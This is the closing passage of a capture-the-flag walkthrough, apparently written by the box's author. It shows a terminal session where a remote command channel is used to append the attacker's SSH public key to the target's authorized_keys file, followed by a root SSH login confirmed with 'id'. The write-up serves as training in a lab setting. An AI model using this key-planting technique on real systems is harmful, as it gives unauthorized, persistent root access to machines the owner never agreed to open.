[*] Enter command to execute (or 'exit' to disconnect): echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIRi2CjickSh2IzxWcG4Sy6SipnzkZygic7XxF12TZg9 kali@kali" >> ~/.ssh/authorized_keys
[+] Command response from ('192.168.67.203', 5555): 
[*] Enter command to execute (or 'exit' to disconnect): exit
[*] Received from server: `[+] Disconnected` from ('192.168.67.203', 5555)
                                                                                                                                                             
┌──(kali㉿kali)-[~/Desktop/sss_over_udp]
└─$ ssh root@cr47.cr
        ,     \    /      ,        
       / \    )\__/(     / \       
      /   \  (_\  /_)   /   \      
 ____/_____\__\@  @/___/_____\____ 
|             |\../|              |
|              \VV/               |    
|     Per Angusta Ad Augusta      |
|           - r0de0 -             |
|_________________________________|
 |    /\ /      \\       \ /\    | 
 |  /   V        ))       V   \  | 
 |/     `       //        '     \| 
 `              V                '
root@cr47:~# id
uid=0(root) gid=0(root) groups=0(root)
```

**GAME OVER**, Now we're really finished !!

That was quite a fun box to create / do, hope you enjoyed it, we've reached the End Game !!


